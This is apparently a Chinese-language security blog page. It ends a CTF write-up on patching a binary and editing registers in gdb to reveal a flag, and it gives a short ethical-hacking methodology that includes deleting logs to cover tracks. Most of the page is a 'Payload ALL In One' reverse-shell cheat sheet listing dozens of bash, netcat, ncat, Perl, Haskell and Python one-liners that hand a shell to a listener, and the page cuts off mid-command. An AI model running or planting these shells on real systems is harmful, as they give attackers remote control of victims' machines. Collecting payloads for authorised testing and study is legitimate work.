&#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Nope~&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (local_10 == *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">  __stack_chk_fail();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

![Untitled](img/pwn_Untitled_16.png)

右鍵點Patch instruction 修改JNZ→JZ，該區塊程式就會變成如果相等就直接執行 puts(&quot;Nope~&quot;); 再另外儲存成ELF，重新執行該檔案

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (local_7c == local_78) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Nope~&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    local_74 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (local_70 = <span class="number">0</span>; local_70 &lt; <span class="number">0x33</span>; local_70 = local_70 + <span class="number">1</span>) &#123;</span><br><span class="line">      <span class="built_in">putchar</span>((<span class="type">int</span>)(<span class="type">char</span>)(*(byte *)((<span class="type">long</span>)&amp;local_48 + (<span class="type">long</span>)(<span class="type">int</span>)local_70) ^</span><br><span class="line">                         *(byte *)((<span class="type">long</span>)&amp;local_68 + (<span class="type">long</span>)local_74)));</span><br><span class="line">      local_74 = local_74 + <span class="number">1</span>;</span><br><span class="line">      uVar1 = (ulong)(<span class="type">long</span>)local_74 / <span class="number">0x1f</span>;</span><br><span class="line">      uVar1 = ((<span class="type">long</span>)local_74 - uVar1 &gt;&gt; <span class="number">1</span>) + uVar1 &gt;&gt; <span class="number">4</span>;</span><br><span class="line">      local_74 = local_74 - ((<span class="type">int</span>)(uVar1 &lt;&lt; <span class="number">5</span>) - (<span class="type">int</span>)uVar1);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

換成

- gdb pwn0_gdb
- gef➤ disas get_flag
- b *0x0000000000401325
- r

![Untitled](img/pwn_Untitled_17.png)

![Untitled](img/pwn_Untitled_18.png)

前面原始碼有看到，相同才會並執行到這裡面的命令

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (local_7c == local_78) &#123;</span><br><span class="line">   local_74 = <span class="number">0</span>;</span><br><span class="line">   <span class="keyword">for</span> (local_70 = <span class="number">0</span>; local_70 &lt; <span class="number">0x33</span>; local_70 = local_70 + <span class="number">1</span>) &#123;</span><br><span class="line">     <span class="built_in">putchar</span>((<span class="type">int</span>)(<span class="type">char</span>)(*(byte *)((<span class="type">long</span>)&amp;local_48 + (<span class="type">long</span>)(<span class="type">int</span>)local_70) ^</span><br><span class="line">                        *(byte *)((<span class="type">long</span>)&amp;local_68 + (<span class="type">long</span>)local_74)));</span><br><span class="line">     local_74 = local_74 + <span class="number">1</span>;</span><br><span class="line">     uVar1 = (ulong)(<span class="type">long</span>)local_74 / <span class="number">0x1f</span>;</span><br><span class="line">     uVar1 = ((<span class="type">long</span>)local_74 - uVar1 &gt;&gt; <span class="number">1</span>) + uVar1 &gt;&gt; <span class="number">4</span>;</span><br><span class="line">     local_74 = local_74 - ((<span class="type">int</span>)(uVar1 &lt;&lt; <span class="number">5</span>) - (<span class="type">int</span>)uVar1);</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

![Untitled](img/pwn_Untitled_19.png)

把eax，edx給輸出出來兩個數值並不同，所以這裡把edx給改成0就可以相同了

![Untitled](img/pwn_Untitled_20.png)

最後改好再執行

![Untitled](img/pwn_Untitled_21.png)
</code></pre>
      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>






  
    <article id="post-PenTest-Method" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/12/21/PenTest-Method/" class="article-date">
  	<time datetime="2024-12-21T12:32:07.091Z" itemprop="datePublished">2024-12-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/12/21/PenTest-Method/">
        The Ethical Hacker Methodology
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <ul>
<li>道德駭客攻擊</li>
<li>滲透測試或白帽駭客攻擊</li>
<li>採用結構化方法來識別和解決電腦系統和網路中的漏洞</li>
<li><p>過程通常涉及以下五個階段</p>
<ul>
<li><p><strong>Reconnaissance</strong></p>
<ul>
<li>收集有關目標系統或網路的資訊</li>
<li>包括被動資訊收集技術，例如搜尋公開資訊、瀏覽網站和檢查 DNS 記錄</li>
<li>目標是收集盡可能多的信息以了解目標並確定潛在的切入點</li>
</ul>
</li>
<li><p><strong>Scanning</strong></p>
<ul>
<li>主動探測目標系統或網絡</li>
<li>發現開放埠、服務和漏洞</li>
<li>使用了各種工具和技術，例如連接埠掃描、網路映射和漏洞掃描</li>
<li>識別可以利用的潛在弱點</li>
</ul>
</li>
<li><p><strong>Gaining Access</strong></p>
<ul>
<li>試圖獲得對目標系統或網路的未經授權的存取</li>
<li>利用掃描階段發現的漏洞</li>
<li>採用密碼破解、社會工程和利用軟體漏洞等技術來存取目標系統</li>
</ul>
</li>
<li><p><strong>Maintaining Access</strong></p>
<ul>
<li>保持對受感染系統或網路的存取</li>
<li>此階段涉及繞過安全機制、設定後門或遠端存取工具以及建立持久存取</li>
<li>目的是模仿真實攻擊者的行為並評估成功入侵的潛在影響。</li>
</ul>
</li>
<li><strong>Covering Tracks</strong><ul>
<li>從目標系統或網路中刪除其活動的任何痕跡</li>
<li>刪除日誌、修改或刪除檔案以及將系統還原到原始狀態</li>
<li>目標是確保道德駭客活動不被發現，不留下任何滲透測試活動的證據</li>
</ul>
</li>
</ul>
</li>
</ul>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>






  
    <article id="post-payload" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/12/21/payload/" class="article-date">
  	<time datetime="2024-12-21T12:32:07.090Z" itemprop="datePublished">2024-12-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/12/21/payload/">
        Payload ALL In One
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="Reverse-shell"><a href="#Reverse-shell" class="headerlink" title="Reverse shell"></a>Reverse shell</h2><ul>
<li>一種網路通信，其中建立從遠端主機（「攻擊者」）到目標主機（「受害者」）的連接</li>
<li>攻擊者能夠在受害者的電腦上執行命令，就好像他們在受害者的電腦上執行指令一樣</li>
<li>透過利用受害者系統中的漏洞或誘騙受害者來運行建立 reverse shell 的惡意程式完成</li>
</ul>
<hr>
<p>example IP: 127.0.0.1<br>example Port: 4444</p>
<h3 id="For-Linux-MAC"><a href="#For-Linux-MAC" class="headerlink" title="For Linux/MAC"></a>For Linux/MAC</h3><ul>
<li>Bash -i</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">linux/mac</span><br><span class="line">- sh -i &gt;&amp; /dev/tcp/127.0.0.1/4444 0&gt;&amp;1</span><br><span class="line">- /bin/sh -i &gt;&amp; /dev/tcp/127.0.0.1/4444 0&gt;&amp;1</span><br><span class="line">- bash -i &gt;&amp; /dev/tcp/127.0.0.1/4444 0&gt;&amp;1</span><br><span class="line">- /bin/bash -i &gt;&amp; /dev/tcp/127.0.0.1/4444 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">windows</span><br><span class="line">- cmd -i &gt;&amp; /dev/tcp/127.0.0.1/4444 0&gt;&amp;1</span><br><span class="line">- powershell -i &gt;&amp; /dev/tcp/127.0.0.1/4444 0&gt;&amp;1</span><br><span class="line">- pwsh -i &gt;&amp; /dev/tcp/127.0.0.1/4444 0&gt;&amp;1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>Bash 196</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">linux/mac</span><br><span class="line">- 0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/127.0.0.1/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br><span class="line">- 0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/127.0.0.1/4444; /bin/sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br><span class="line">- 0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/127.0.0.1/4444; bash &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br><span class="line">- 0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/127.0.0.1/4444; /bin/bash &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br><span class="line"></span><br><span class="line">windows</span><br><span class="line">- 0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/127.0.0.1/4444; cmd &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br><span class="line">- 0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/127.0.0.1/4444; powershell &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br><span class="line">- 0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/127.0.0.1/4444; pwsh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>Bash read line</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">linux/mac/windows</span><br><span class="line">- exec 5&lt;&gt;/dev/tcp/127.0.0.1/4444;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>Bash 5</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">linux/mac</span><br><span class="line">- sh -i 5&lt;&gt; /dev/tcp/127.0.0.1/4444 0&lt;&amp;5 1&gt;&amp;5 2&gt;&amp;5</span><br><span class="line">- /bin/sh -i 5&lt;&gt; /dev/tcp/127.0.0.1/4444 0&lt;&amp;5 1&gt;&amp;5 2&gt;&amp;5</span><br><span class="line">- bash -i 5&lt;&gt; /dev/tcp/127.0.0.1/4444 0&lt;&amp;5 1&gt;&amp;5 2&gt;&amp;5</span><br><span class="line">- /bin/bash -i 5&lt;&gt; /dev/tcp/127.0.0.1/4444 0&lt;&amp;5 1&gt;&amp;5 2&gt;&amp;5</span><br><span class="line"></span><br><span class="line">windows</span><br><span class="line">- cmd -i 5&lt;&gt; /dev/tcp/127.0.0.1/4444 0&lt;&amp;5 1&gt;&amp;5 2&gt;&amp;5</span><br><span class="line">- powershell -i 5&lt;&gt; /dev/tcp/127.0.0.1/4444 0&lt;&amp;5 1&gt;&amp;5 2&gt;&amp;5</span><br><span class="line">- pwsh -i 5&lt;&gt; /dev/tcp/127.0.0.1/4444 0&lt;&amp;5 1&gt;&amp;5 2&gt;&amp;5</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>Bash udp</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">linux/mac</span><br><span class="line">- sh -i &gt;&amp; /dev/udp/127.0.0.1/4444 0&gt;&amp;1</span><br><span class="line">- /bin/sh -i &gt;&amp; /dev/udp/127.0.0.1/4444 0&gt;&amp;1</span><br><span class="line">- bash -i &gt;&amp; /dev/udp/127.0.0.1/4444 0&gt;&amp;1</span><br><span class="line">- /bin/bash -i &gt;&amp; /dev/udp/127.0.0.1/4444 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">windows</span><br><span class="line">- cmd -i &gt;&amp; /dev/udp/127.0.0.1/4444 0&gt;&amp;1</span><br><span class="line">- powershell -i &gt;&amp; /dev/udp/127.0.0.1/4444 0&gt;&amp;1</span><br><span class="line">- pwsh -i &gt;&amp; /dev/udp/127.0.0.1/4444 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>nc mkfifo</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">linux/mac</span><br><span class="line">- rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 127.0.0.1 4444 &gt;/tmp/f</span><br><span class="line">- rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 127.0.0.1 4444 &gt;/tmp/f</span><br><span class="line">- rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2&gt;&amp;1|nc 127.0.0.1 4444 &gt;/tmp/f</span><br><span class="line">- rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 127.0.0.1 4444 &gt;/tmp/f</span><br><span class="line"></span><br><span class="line">windows</span><br><span class="line">- rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|cmd -i 2&gt;&amp;1|nc 127.0.0.1 4444 &gt;/tmp/f</span><br><span class="line">- rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|powershell -i 2&gt;&amp;1|nc 127.0.0.1 4444 &gt;/tmp/f</span><br><span class="line">- rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|pwsh -i 2&gt;&amp;1|nc 127.0.0.1 4444 &gt;/tmp/f</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>nc -e</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">linux/mac</span><br><span class="line">- nc 127.0.0.1 4444 -e sh</span><br><span class="line">- nc 127.0.0.1 4444 -e /bin/sh</span><br><span class="line">- nc 127.0.0.1 4444 -e bash</span><br><span class="line">- nc 127.0.0.1 4444 -e /bin/bash</span><br><span class="line"></span><br><span class="line">windows</span><br><span class="line">- nc 127.0.0.1 4444 -e cmd</span><br><span class="line">- nc 127.0.0.1 4444 -e powershell</span><br><span class="line">- nc 127.0.0.1 4444 -e pwsh</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>nc -c</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">linux/mac</span><br><span class="line">- nc -c sh 127.0.0.1 4444</span><br><span class="line">- nc -c /bin/sh 127.0.0.1 4444</span><br><span class="line">- nc -c bash 127.0.0.1 4444</span><br><span class="line">- nc -c /bin/bash 127.0.0.1 4444</span><br><span class="line"></span><br><span class="line">windows</span><br><span class="line">- nc -c cmd 127.0.0.1 4444</span><br><span class="line">- nc -c powershell 127.0.0.1 4444</span><br><span class="line">- nc -c pwsh 127.0.0.1 4444</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>ncat -e</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">linux/mac</span><br><span class="line">- ncat 127.0.0.1 4444 -e sh</span><br><span class="line">- ncat 127.0.0.1 4444 -e /bin/sh</span><br><span class="line">- ncat 127.0.0.1 4444 -e bash</span><br><span class="line">- ncat 127.0.0.1 4444 -e /bin/bash</span><br><span class="line"></span><br><span class="line">windows</span><br><span class="line">- ncat 127.0.0.1 4444 -e cmd</span><br><span class="line">- ncat 127.0.0.1 4444 -e powershell</span><br><span class="line">- ncat 127.0.0.1 4444 -e pwsh</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>ncat udp</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">linux/mac</span><br><span class="line">- rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|ncat -u 127.0.0.1 4444 &gt;/tmp/f</span><br><span class="line">- rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|ncat -u 127.0.0.1 4444 &gt;/tmp/f</span><br><span class="line">- rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2&gt;&amp;1|ncat -u 127.0.0.1 4444 &gt;/tmp/f</span><br><span class="line">- rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|ncat -u 127.0.0.1 4444 &gt;/tmp/f</span><br><span class="line"></span><br><span class="line">windows</span><br><span class="line">- rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|cmd -i 2&gt;&amp;1|ncat -u 127.0.0.1 4444 &gt;/tmp/f</span><br><span class="line">- rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|powershell -i 2&gt;&amp;1|ncat -u 127.0.0.1 4444 &gt;/tmp/f</span><br><span class="line">- rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|pwsh -i 2&gt;&amp;1|ncat -u 127.0.0.1 4444 &gt;/tmp/f</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>rustcat</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">linux/mac</span><br><span class="line">- rcat 127.0.0.1 4444 -r sh</span><br><span class="line">- rcat 127.0.0.1 4444 -r /bin/sh</span><br><span class="line">- rcat 127.0.0.1 4444 -r bash</span><br><span class="line">- rcat 127.0.0.1 4444 -r /bin/bash</span><br><span class="line"></span><br><span class="line">windows</span><br><span class="line">- rcat 127.0.0.1 4444 -r cmd</span><br><span class="line">- rcat 127.0.0.1 4444 -r powershell</span><br><span class="line">- rcat 127.0.0.1 4444 -r pwsh</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>Haskell #1    </li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">module Main where</span><br><span class="line"></span><br><span class="line">import System.Process</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">下面這一條有不同使用方式，根據自身環境選擇其中一條 `main=...` 使用</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">linux/mac</span></span><br><span class="line">- main = callCommand &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | sh -i 2&gt;&amp;1 | nc 127.0.0.1 4444 &gt;/tmp/f&quot;</span><br><span class="line">- main = callCommand &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 127.0.0.1 4444 &gt;/tmp/f&quot;</span><br><span class="line">- main = callCommand &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | bash -i 2&gt;&amp;1 | nc 127.0.0.1 4444 &gt;/tmp/f&quot;</span><br><span class="line">- main = callCommand &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2&gt;&amp;1 | nc 127.0.0.1 4444 &gt;/tmp/f&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">windows</span></span><br><span class="line">- main = callCommand &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | cmd -i 2&gt;&amp;1 | nc 127.0.0.1 4444 &gt;/tmp/f&quot;</span><br><span class="line">- main = callCommand &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | powershell -i 2&gt;&amp;1 | nc 127.0.0.1 4444 &gt;/tmp/f&quot;</span><br><span class="line">- main = callCommand &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | pwsh -i 2&gt;&amp;1 | nc 127.0.0.1 4444 &gt;/tmp/f&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>Perl</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">linux/mac</span><br><span class="line">- perl -e &#x27;use Socket;$i=&quot;127.0.0.1&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;sh -i&quot;);&#125;;&#x27;</span><br><span class="line">- perl -e &#x27;use Socket;$i=&quot;127.0.0.1&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span><br><span class="line">- perl -e &#x27;use Socket;$i=&quot;127.0.0.1&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;bash -i&quot;);&#125;;&#x27;</span><br><span class="line">- perl -e &#x27;use Socket;$i=&quot;127.0.0.1&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/bash -i&quot;);&#125;;&#x27;</span><br><span class="line"></span><br><span class="line">windows</span><br><span class="line">- perl -e &#x27;use Socket;$i=&quot;127.0.0.1&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;cmd -i&quot;);&#125;;&#x27;</span><br><span class="line">- perl -e &#x27;use Socket;$i=&quot;127.0.0.1&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;powershell -i&quot;);&#125;;&#x27;</span><br><span class="line">- perl -e &#x27;use Socket;$i=&quot;127.0.0.1&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;pwsh -i&quot;);&#125;;&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>Perl no sh</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">linux/mac</span><br><span class="line">- perl -MIO -e &#x27;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;127.0.0.1:4444&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#x27;</span><br><span class="line">- perl -e &#x27;use Socket;$i=&quot;127.0.0.1&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span><br><span class="line">- perl -e &#x27;use Socket;$i=&quot;127.0.0.1&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;bash -i&quot;);&#125;;&#x27;</span><br><span class="line"></span><br><span class="line">windows</span><br><span class="line">- perl -MIO -e &#x27;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;127.0.0.1:4444&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>Python</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">linux/mac</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">python2</span></span><br><span class="line">- export RHOST=&quot;127.0.0.1&quot;;export RPORT=4444;python -c &#x27;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;sh&quot;)&#x27;</span><br><span class="line">- export RHOST=&quot;127.0.0.1&quot;;export RPORT=4444;python -c &#x27;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;/bin/sh&quot;)&#x27;</span><br><span class="line">- export RHOST=&quot;127.0.0.1&quot;;export RPORT=4444;python -c &#x27;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;bash&quot;)&#x27;</span><br><span class="line">- export RHOST=&quot;127.0.0.1&quot;;export RPORT=4444;python -c &#x27;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line"></span><br><span class="line">- python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;127.0.0.1&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;sh&quot;)&#x27;</span><br><span class="line">- python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;127.0.0.1&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/sh&quot;)&#x27;</span><br><span class="line">- python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;127.0.0.1&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;bash&quot;)&#x27;</span><br><span class="line">- python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;127.0.0.1&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">python3</span></span><br><span class="line">- export RHOST=&quot;127.0.0.1&quot;;export RPORT=4444;python3 -c &#x27;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;sh&quot;)&#x27;</span><br><span class="line">- export RHOST=&quot;127.0.0.1&quot;;export RPORT=4444;python3 -c &#x27;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;/bin/sh&quot;)&#x27;</span><br><span class="line">- export RHOST=&quot;127.0.0.1&quot;;export RPORT=4444;python3 -c &#x27;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;bash&quot;)&#x27;</span><br><span class="line">- export RHOST=&quot;127.0.0.1&quot;;export RPORT=4444;python3 -c &#x27;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line"></span><br><span class="line">- python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;127.0.0.1&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;sh&quot;)&#x27;</span><br><span class="line">- python3 -c &#x27;import 